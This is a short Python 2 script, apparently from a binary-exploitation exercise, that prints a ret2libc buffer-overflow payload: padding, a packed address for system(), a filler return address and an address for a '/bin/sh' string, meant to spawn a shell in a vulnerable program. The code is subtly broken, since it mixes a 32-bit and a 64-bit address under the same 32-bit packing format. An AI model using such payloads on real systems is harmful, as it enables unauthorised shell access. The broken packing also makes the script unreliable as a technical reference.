import struct
padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
system = struct.pack("I",0xb7ecffb0)
return_after_system = "AAAA"
bin_sh = struct.pack("I", 0x7ffff7f6a573)
print padding + system + return_after_system +  bin_sh
